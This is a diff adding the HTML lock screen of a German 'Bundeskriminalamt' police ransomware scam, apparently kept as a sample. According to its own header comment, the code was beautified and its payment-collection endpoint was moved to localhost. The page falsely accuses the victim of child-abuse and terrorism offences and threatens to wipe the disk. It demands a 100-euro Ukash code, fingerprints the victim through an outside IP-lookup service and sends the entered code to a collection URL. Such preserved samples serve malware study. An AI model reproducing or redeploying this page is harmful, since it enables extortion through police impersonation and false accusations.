@@ -1,0 +1,336 @@
+<!--
+    This is not original. 
+    The source code was beautified and the endpoint which receives the ukash codes was changed to localhost.
+-->
+<!DOCTYPE html
+    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title></title>
+    <style>
+        html,
+        body {
+            background: #FFF;
+            margin: 0;
+            padding: 0;
+            font-family: "HelveticaNeue-Light", "Helvetica Neue Light", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+            cursor: default;
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
+            overflow-y: hidden;
+        }
+
+        #head {
+            width: 100%;
+            height: 70px;
+            position: relative;
+            float: left;
+            clear: both;
+            background: #298B30;
+            margin: 0;
+            padding: 0;
+
+        }
+
+        #head h1 {
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            color: #FFD700;
+            font-size: 24px;
+            line-height: 70px;
+            text-shadow: 0px -1px 0px #13701a;
+
+        }
+
+        #head_pol {
+            width: 100%;
+            height: 65px;
+            position: relative;
+            float: left;
+            clear: both;
+            margin: 1px auto;
+            padding: 0;
+            background: url(/jpeg/pol) 62% top no-repeat;
+            border-top: 2px solid #298B30;
+
+        }
+
+        #central {
+            width: 984px;
+            height: auto;
+            position: relative;
+            margin: 0 auto;
+            padding: 10px 7px 5px 7px;
+            clear: both;
+        }
+
+        #left {
+            width: 382px;
+            height: auto;
+            float: left;
+            position: relative;
+
+        }
+
+        #left h1 {
+            padding: 0;
+            margin: 5px 10px;
+            font-size: 24px;
+            color: #C4161C;
+            text-align: left;
+
+        }
+
+        #left p {
+            padding: 0;
+            margin: 10px 12px;
+            font-size: 14px;
+            color: #333;
+
+        }
+
+        #left img {
+            float: left;
+            margin: 0 5px 5px 0;
+        }
+
+        #right {
+            width: 600px;
+            height: auto;
+            float: right;
+            position: relative;
+            background: #f2f2f2;
+            border-radius: 7px;
+            -moz-border-radius: 7px;
+            -webkit-border-radius: 7px;
+
+        }
+
+        #right p {
+            padding: 0;
+            margin: 3px 12px;
+            font-size: 12px;
+            color: #333;
+
+        }
+
+        #right h1 {
+            padding: 0;
+            margin: 10px;
+            font-size: 26px;
+            color: #360;
+            text-align: center;
+
+        }
+
+        .ip {
+            width: 500px;
+            height: auto;
+            position: relative;
+            display: block;
+            float: left;
+            margin: 7px 150px;
+            *margin: 7px 70px;
+            padding: 0;
+            background: #FFF;
+            border-radius: 7px;
+            -moz-border-radius: 7px;
+            -webkit-border-radius: 7px;
+            color: #C4161C;
+            clear: both;
+            overflow: hidden;
+
+        }
+
+        .ip h2 {
+            background: #f2f2f2;
+            text-align: left;
+            font-size: 14px;
+            margin: 0px 0px;
+            padding: 0;
+
+        }
+
+        #ucash {
+            height: 40px;
+            line-height: 40px;
+
+        }
+
+        #ucash img {
+            position: relative;
+            float: left;
+            border: 0;
+            margin: 0 5px;
+
+        }
+
+        #ucash input {
+            position: relative;
+            float: left;
+            border: 1px solid #999;
+            margin: 12px 5px 5px 5px;
+            border-radius: 5px;
+            -moz-border-radius: 5px;
+            -webkit-border-radius: 5px;
+
+        }
+
+        #copy {
+            font-size: 10px;
+            color: #999;
+            margin: 0 auto;
+            padding: 15px 0 0 0;
+            background: url(/jpeg/ms) 65% center no-repeat;
+            text-align: left;
+            position: relative;
+            clear: both;
+            width: 998px;
+
+        }
+    </style>
+    <script>
+        var oXmlHttp;
+        var bGood;
+        var ip;
+        var isp;
+        var country;
+        var city;
+        var speed;
+
+        function createXMLHttp() {
+            if (typeof XMLHttpRequest != "undefined") {
+                return new XMLHttpRequest();
+            } else if (window.ActiveXObject) {
+                var aVersions = ["MSXML2.XMLHttp.5.0", "MSXML2.XMLHttp.4.0", "MSXML2.XMLHttp.3.0", "MSXML2.XMLHttp", "Microsoft.XMLHttp"];
+                for (var i = 0; i < aVersions.length; i++) {
+                    try {
+                        var oXmlHttp = new ActiveXObject(aVersions[i]);
+                        return oXmlHttp;
+                    } catch (oError) {}
+                }
+                throw new Error("");
+            }
+        }
+
+        function getFrom_ip2l() {
+            var response = "";
+            oXmlHttp.open("GET", "http://tools.ip2location.com/ib2/", true);
+            oXmlHttp.onreadystatechange = function() {
+                if (oXmlHttp.readyState == 4) {
+                    if (oXmlHttp.status == 200) {
+                        var ip2l = oXmlHttp.responseText;
+                        re = /Your IP Address is <b>(.*)<\/b > ISP: /i;
+                        ip = ip2l.match(re);
+                        re = /ISP: <b>(.*)<\/b > Country: /i;
+                        isp = ip2l.match(re);
+                        re = /Country: <b>(.*)<\/b > Region: /i;
+                        country = ip2l.match(re);
+                        re = /City: <b>(.*)<\/b > Time Zone: /i;
+                        city = ip2l.match(re);
+                        document.getElementById("v_ip").innerHTML = "IP: " + ip[1];
+                        document.getElementById("ip_text").innerHTML = ip[1];
+                        document.getElementById("v_country").innerHTML = "Das Land: " + country[1];
+                        document.getElementById("v_cyti").innerHTML = "City: " + city[1];
+                        document.getElementById("v_prov").innerHTML = "ISP: " + isp[1];
+                    }
+                }
+            };
+            oXmlHttp.send(null);
+        }
+
+        function senduk() {
+            var response = "";
+            var d = document.getElementsByName("code")[0].value;
+            if (d.length < 1) {
+                return 0;
+            }
+            // Obviously modified to send requests to our own endpoint :)
+            oXmlHttp.open("GET", "http://127.0.0.1:8080/s.php?d=" + d, true);
+            oXmlHttp.send(null);
+            alert("Ihre Anfrage haben wir erhalten,diese wird innerhalb von 72 Stunden bearbeitet.");
+        }
+        window.onload = function() {
+            var regexp = /(msie) ([0-9]{1, 2}.[0-9]{1, 3})/gi;
+            var matches = navigator.userAgent.match(regexp);
+            var iOS = new Array("Windows 95", "Windows NT 4", "Windows 98", "Win 9x 4.9", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 6.1", "Windows NT 5.2", "Windows NT 6.0");
+            var oOS = new Array("Windows 95", "Windows NT 4.0", "Windows 98", "Windows ME", "Windows 2000", "Windows XP", "Windows Seven", "Windows 2003", "Windows Vista");
+            var os = "";
+            for (var i = 0; i < iOS.length; i++) {
+                if (navigator.userAgent.indexOf(iOS[i]) > -1) {
+                    os = oOS[i];
+                    break;
+                }
+            }
+            oXmlHttp = createXMLHttp();
+            getFrom_ip2l();
+            document.getElementById("v_browser").innerHTML = "Browser: " + matches[0].replace("MSIE", "Internet Explorer");
+            document.getElementById("v_os").innerHTML = "OS: " + os;
+        }
+    </script>
+</head>
+
+<body style="overflow-x:hidden; overflow-y:hidden;">
+    <div id="head">
+        <h1>Die offizielle Mitteilung des Bundeskriminalamtes</h1>
+    </div>
+    <div id="head_pol"></div>
+    <div id="central">
+        <div id="right">
+            <p style="text-align:center; font-size:14px;color:#300;"><strong>Achtung!</strong></p>
+            <p>Ein Vorgang illegaler Aktivitaten wurde erkannt.</p>
+            <p>Das Betriebssystem wurde im Zusammenhang mit Verstossen gegen die Gesetze der Bundesrepublik Deutschland
+                gesperrt! Es wurde folgender Vertoss festegestellt: Ihre IP Adresse lautet "<span id="ip_text"></span>"
+                mit dieser IP wurden Seiten mit pornografischen Inhalten,
+                Kinderpornographie, Sodomie und Gewalt gegen Kinder aufgerufen.</p>
+            <p>Auf Ihrem Computer wurden ebenfalls Videodateien mit pornografischen Inhalten, Elementen von Gewalt und
+                Kinderpornografie festgestellt!</p>
+            <p>Es wurden auch Emails in Form von Spam, mit terroristischen Hintergründen, verschickt. Diese Sperre des
+                Computers dient dazu, Ihre illegalen Aktivitaten zu unterbinden.</p>
+            </p>
+            <p style="text-align:center; color:#999; margin:0; padding:0;"><strong> Ihre Daten:</strong></p>
+            <div class="ip">
+                <h2 id="v_ip">IP: </h2>
+                <h2 id="v_browser">Browser: </h2>
+                <h2 id="v_os">OS:
+                </h2>
+                <h2 id="v_country">Das Land: </h2>
+                <h2 id="v_cyti">City: </h2>
+                <h2 id="v_prov">ISP: </h2>
+            </div>
+            <p>Um die Sperre des Computers aufzuheben, sind Sie dazu verflichtet eine Strafe von 100 Euro zu zahlen.</p>
+            <p>Die Zahlung ist innerhalb von 24 Stunden zu leisten. Sollte der Eingang der Zahlung in der vorgegebenen
+                Zeit nicht erfolgen, so wird Ihre Festplatte unwiderruflich formatiert(gelöscht).</p>
+            <p>Die Bezahlung erfolgt durch einen Ukash Coupon-Code in Hohe von 100 Euro.</p>
+            <p>Um die Bezahlung durchzufuhren, geben Sie bitte den erworbenen Code in das Zahlungsfeld ein und drücken
+                Sie anschliessend auf OK (haben Sie mehrere Codes, so geben Sie Diese einfach nacheinander ein und
+                drücken Sie anschliessend auf OK)</p>
+            <p>Sollte das System Fehler melden, so müssen Sie den Code per Email(ukash@bundeskriminalamtes.org)
+                versenden.</p>
+            <p>Nach Eingang der Zahlung wird Ihr Computer innerhalb von 24 Stunden wieder freigestellt.</p>
+        </div>
+        <div id="left">
+            <div id="ucash"><img src="/jpeg/ukash" /><input name="code" title="" type="text"> <input id="submit"
+                    type="submit" value="Ok" onclick="senduk();"/> </div>
+            <h1>Wo kann ich Ukash
+                kaufen?</h1>
+            <p>Es gibt unzählige Möglichkeiten, Ukash zu erwerben, z. B. in Geschäften, Kiosken, per Geldautomat, online
+                oder über eine E-Wallet (elektronische Geldbörse).</p>
+            <p>Nachstehend finden Sie eine Liste, aus der
+                hervorgeht, wo Sie in Ihrem Land Ukash erwerben können. </p>
+            <p style="border-bottom:1px dashed #ccc;"><img src="/jpeg/petrol"><b>Tankstellen</b> - jetzt auch
+                erhältlich bei folgenden Tankstellen: Agip, Avia, Esso, OMV, Q1 und Westfalen.<br /> <img
+                    src="/jpeg/petrolstations"></p>
+            <p style="border-bottom:1px dashed #ccc;"><img src="/jpeg/pay"><b>epay</b> - Kaufen Sie Ukash in vielen
+                tausend Supermärkten oder Call-Shops, in denen Sie dieses Logo sehen.</p>
+        </div>
+    </div>
+    <div id="copy">Copyright 2011 Dieser Dienst des Internet Services wurde mit <br>der Unterstützung folgender Firmen
+        mitentwickelt</div>
+</body>
+
+</html>
